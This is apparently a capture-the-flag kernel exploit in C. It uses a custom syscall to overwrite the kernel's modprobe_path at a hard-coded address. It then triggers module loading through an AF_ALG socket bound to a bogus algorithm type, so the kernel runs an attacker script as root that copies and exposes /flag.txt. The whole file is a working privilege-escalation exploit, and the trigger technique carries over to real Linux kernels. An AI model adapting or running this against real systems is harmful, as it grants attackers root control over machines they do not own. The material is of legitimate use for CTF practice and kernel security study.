#include "libpwn.c"

#define SYS_NAUP 549 
#define MODPROBE_ADDR 0xffffffff82b45b20

struct sockaddr_alg {
    sa_family_t salg_family;     // e.g., AF_ALG
    uint8_t     salg_type[14];   // e.g., "hash" or "skcipher"
    uint32_t    salg_feat;       // optional
    uint32_t    salg_mask;       // optional
    uint8_t     salg_name[64];   // e.g., "sha256" or similar
};

int fd;
int main() {
    int ret = syscall(SYS_NAUP, (void *)MODPROBE_ADDR, DEFAULT_EVIL_MODPROBE_PATH);
    if (ret < 0) {
        panic("naup syscall failed");
    }

    modprobe_attack("cat /flag.txt > /tmp/flag; chmod 777 /tmp/flag", DEFAULT_MODPROBE_TRIGGER, DEFAULT_EVIL_MODPROBE_PATH);

    // https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch

    struct sockaddr_alg sa;
    pid_t pid = getpid();
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
            perror("socket(AF_ALG) failed");
            return 1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "V4bel");  // dummy string
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));

    _pause_("end of exploit...");
}